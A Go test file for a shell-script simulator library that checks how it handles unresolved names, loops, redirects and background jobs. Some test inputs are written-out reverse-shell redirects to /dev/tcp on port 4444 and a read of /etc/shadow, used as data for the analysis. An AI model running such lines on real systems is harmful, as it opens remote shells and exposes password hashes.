package libcommand

import (
	"context"
	"slices"
	"testing"
)

func TestSimulatorContinuesAfterUnresolvedCommandName(t *testing.T) {
	unresolvedNames := 0
	afterCalls := 0
	simulator := NewBuilder().
		Command("*", func(_ context.Context, command *CommandContext, invocation *Invocation) (*CommandResult, error) {
			if invocation.Unresolved != nil && invocation.Unresolved.Name {
				unresolvedNames++
			}
			return command.UnresolvedResult(), nil
		}).
		Command("record", func(_ context.Context, _ *CommandContext, _ *Invocation) (*CommandResult, error) {
			afterCalls++
			return &CommandResult{}, nil
		}).
		Build()

	err := simulator.Simulate(context.Background(), &SimulationRequest{
		Source: `name=$(producer); "$name" argument; record after`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if unresolvedNames != 1 || afterCalls != 1 {
		t.Fatalf("unresolved command names = %d, record calls = %d", unresolvedNames, afterCalls)
	}
}

func TestSimulatorExploresUnknownWordLoopWithoutBodyCandidate(t *testing.T) {
	var arguments []*Argument
	simulator := NewBuilder().
		Command("record", func(_ context.Context, _ *CommandContext, invocation *Invocation) (*CommandResult, error) {
			arguments = append(arguments, invocation.Args[0])
			return &CommandResult{}, nil
		}).
		Build()

	err := simulator.Simulate(context.Background(), &SimulationRequest{
		Source: `for item in $(producer); do value=$item; done; record "${value-unset}"`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(arguments) != 2 {
		t.Fatalf("record arguments = %#v, want zero- and one-iteration paths", arguments)
	}
	if arguments[0].Kind == arguments[1].Kind {
		t.Fatalf("record arguments = %#v, want one concrete and one unresolved value", arguments)
	}
	for _, argument := range arguments {
		if argument.Kind == ArgumentString && argument.Value != "unset" {
			t.Fatalf("concrete argument = %q, want unset", argument.Value)
		}
	}
}

func TestSimulatorContinuesAfterUnresolvedAndAmbiguousRedirects(t *testing.T) {
	var redirects []*Redirect
	afterCalls := 0
	simulator := NewBuilder().
		Command("probe", func(_ context.Context, command *CommandContext, invocation *Invocation) (*CommandResult, error) {
			if len(invocation.Args) != 0 && invocation.Args[0].Value == "redirected" {
				redirects = clonePublicRedirects(command.Redirects())
			} else {
				afterCalls++
			}
			return &CommandResult{}, nil
		}).
		Build()

	err := simulator.Simulate(context.Background(), &SimulationRequest{
		Source: `target=$(producer); probe redirected >"$target"; unset missing; echo data >$missing; probe after`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(redirects) != 1 || !redirects[0].Unresolved {
		t.Fatalf("redirects = %#v, want one unresolved target", redirects)
	}
	if afterCalls == 0 {
		t.Fatal("probe after was not reached")
	}
}

func TestMiddlewareObservesCommandsBehindUncertainRedirections(t *testing.T) {
	tests := []struct {
		name                string
		source              string
		wantCommand         string
		wantTarget          string
		wantUnresolvedStdin bool
	}{
		{
			name:        "output",
			source:      `echo payload >/var/log/messages`,
			wantCommand: "echo",
			wantTarget:  "/var/log/messages",
		},
		{
			name:        "input",
			source:      `cat </etc/shadow`,
			wantCommand: "cat",
			wantTarget:  "/etc/shadow",
		},
		{
			name:        "relative output",
			source:      `echo payload >missing/messages`,
			wantCommand: "echo",
			wantTarget:  "/missing/messages",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var commandName string
			var redirects []*Redirect
			var unresolvedStdin bool
			middleware := func(next Command) Command {
				return func(ctx context.Context, command *CommandContext, invocation *Invocation) (*CommandResult, error) {
					commandName = invocation.Name
					redirects = clonePublicRedirects(command.Redirects())
					unresolvedStdin = invocation.Unresolved != nil && invocation.Unresolved.Stdin
					return next(ctx, command, invocation)
				}
			}
			simulator := NewBuilder().Middleware(middleware).Build()

			if err := simulator.Simulate(context.Background(), &SimulationRequest{Source: test.source}); err != nil {
				t.Fatal(err)
			}
			if commandName != test.wantCommand {
				t.Fatalf("command = %q, want %q", commandName, test.wantCommand)
			}
			if len(redirects) != 1 || redirects[0].Target != test.wantTarget {
				t.Fatalf("redirects = %#v, want target %q", redirects, test.wantTarget)
			}
			if unresolvedStdin != test.wantUnresolvedStdin {
				t.Fatalf("unresolved stdin = %t, want %t", unresolvedStdin, test.wantUnresolvedStdin)
			}
		})
	}
}

func TestMissingRedirectionsUseEmptyVirtualFiles(t *testing.T) {
	var input []byte
	var inputUnresolved bool
	var output []byte
	var outputUnresolved bool
	var outputExists bool
	simulator := NewBuilder().
		Command("capture-input", func(_ context.Context, _ *CommandContext, invocation *Invocation) (*CommandResult, error) {
			input = append([]byte(nil), invocation.Stdin...)
			inputUnresolved = invocation.Unresolved != nil && invocation.Unresolved.Stdin
			return &CommandResult{}, nil
		}).
		Command("inspect-output", func(_ context.Context, command *CommandContext, _ *Invocation) (*CommandResult, error) {
			output, outputUnresolved, outputExists = command.ReadFile("/missing/output")
			return &CommandResult{}, nil
		}).
		Build()

	if err := simulator.Simulate(context.Background(), &SimulationRequest{
		Source: `capture-input <missing/input; echo payload >missing/output; inspect-output`,
	}); err != nil {
		t.Fatal(err)
	}
	if len(input) != 0 || inputUnresolved {
		t.Fatalf("input = %q, unresolved = %t; want a concrete empty file", input, inputUnresolved)
	}
	if !outputExists || outputUnresolved || string(output) != "payload\n" {
		t.Fatalf("output = %q, exists = %t, unresolved = %t", output, outputExists, outputUnresolved)
	}
}

func TestSimulatorModelsArbitraryDescriptorsAndExternalDevices(t *testing.T) {
	var calls []*Invocation
	var redirects [][]*Redirect
	simulator := NewBuilder().
		Command("probe", func(_ context.Context, command *CommandContext, invocation *Invocation) (*CommandResult, error) {
			copied := *invocation
			calls = append(calls, &copied)
			redirects = append(redirects, clonePublicRedirects(command.Redirects()))
			return &CommandResult{}, nil
		}).
		Build()

	source := `probe 5<>/dev/tcp/198.51.100.42/4444 0<&5 1>&5 2>&5
probe >&/dev/tcp/203.0.113.26/4444
echo 0>stdin-file
echo 3>extra-file
probe after`
	if err := simulator.Simulate(context.Background(), &SimulationRequest{Source: source}); err != nil {
		t.Fatal(err)
	}
	if len(calls) != 3 || len(redirects[0]) != 4 || len(redirects[1]) != 1 {
		t.Fatalf("calls = %#v, redirects = %#v", calls, redirects)
	}
	if calls[0].Unresolved == nil || !calls[0].Unresolved.Stdin {
		t.Fatalf("first invocation = %#v, want unresolved external-device stdin", calls[0])
	}
	if got := redirects[1][0]; got.Operator != ">&" || got.Target != "/dev/tcp/203.0.113.26/4444" {
		t.Fatalf("external redirect = %#v", got)
	}
}

func TestSimulatorSyntaxChecksShellWithoutExecutingBody(t *testing.T) {
	var calls []string
	simulator := NewBuilder().
		Command("dangerous", func(_ context.Context, _ *CommandContext, _ *Invocation) (*CommandResult, error) {
			calls = append(calls, "dangerous")
			return &CommandResult{}, nil
		}).
		Command("record", func(_ context.Context, _ *CommandContext, _ *Invocation) (*CommandResult, error) {
			calls = append(calls, "record")
			return &CommandResult{}, nil
		}).
		Build()

	source := `bash -n -c 'dangerous from-command'
printf '%s\n' 'dangerous from-pipe' | bash -n
bash -n <<'EOF'
dangerous from-heredoc
EOF
record after`
	if err := simulator.Simulate(context.Background(), &SimulationRequest{Source: source}); err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(calls, []string{"record"}) {
		t.Fatalf("calls = %#v, want syntax checking followed by record only", calls)
	}
}

func TestSimulatorAcceptsInteractiveShellOption(t *testing.T) {
	var calls []string
	simulator := NewBuilder().
		Command("record", func(_ context.Context, _ *CommandContext, invocation *Invocation) (*CommandResult, error) {
			calls = append(calls, invocation.Args[0].Value)
			return &CommandResult{}, nil
		}).
		Build()

	source := `printf '%s' 'record nested' | bash -i
sh -i </dev/null
record after`
	if err := simulator.Simulate(context.Background(), &SimulationRequest{Source: source}); err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(calls, []string{"nested", "after"}) {
		t.Fatalf("calls = %#v", calls)
	}
}

func TestSimulatorAcceptsExecArgvZeroAndLoginOptions(t *testing.T) {
	var calls []string
	simulator := NewBuilder().
		Command("target", func(_ context.Context, _ *CommandContext, _ *Invocation) (*CommandResult, error) {
			calls = append(calls, "target")
			return &CommandResult{}, nil
		}).
		Command("record", func(_ context.Context, _ *CommandContext, _ *Invocation) (*CommandResult, error) {
			calls = append(calls, "record")
			return &CommandResult{}, nil
		}).
		Build()

	source := `(exec -a alternate target); (exec -l target); exec 5<>/dev/tcp/192.0.2.19/4444; record after`
	if err := simulator.Simulate(context.Background(), &SimulationRequest{Source: source}); err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(calls, []string{"target", "target", "record"}) {
		t.Fatalf("calls = %#v", calls)
	}
}

func TestSimulatorBoundsBackgroundInfiniteLoop(t *testing.T) {
	calls := 0
	simulator := NewBuilder().
		Limits(&Limits{MaxExecutionSteps: 100}).
		Command("record", func(_ context.Context, _ *CommandContext, _ *Invocation) (*CommandResult, error) {
			calls++
			return &CommandResult{}, nil
		}).
		Build()

	err := simulator.Simulate(context.Background(), &SimulationRequest{
		Source: `(while true; do :; done) & record after`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if calls != 1 {
		t.Fatalf("record calls = %d, want 1", calls)
	}
}

func TestSimulatorCompletesFiniteBackgroundLoop(t *testing.T) {
	var calls []string
	simulator := NewBuilder().
		Limits(&Limits{MaxExecutionSteps: 100}).
		Command("record", func(_ context.Context, _ *CommandContext, invocation *Invocation) (*CommandResult, error) {
			calls = append(calls, invocation.Args[0].Value)
			return &CommandResult{}, nil
		}).
		Build()

	err := simulator.Simulate(context.Background(), &SimulationRequest{
		Source: `(for ((i=0; i<3; i++)); do record "$i"; done) & record after`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(calls, []string{"0", "1", "2", "after"}) {
		t.Fatalf("calls = %#v", calls)
	}
}

func clonePublicRedirects(source []*Redirect) []*Redirect {
	result := make([]*Redirect, len(source))
	for index, redirect := range source {
		copied := *redirect
		result[index] = &copied
	}
	return result
}
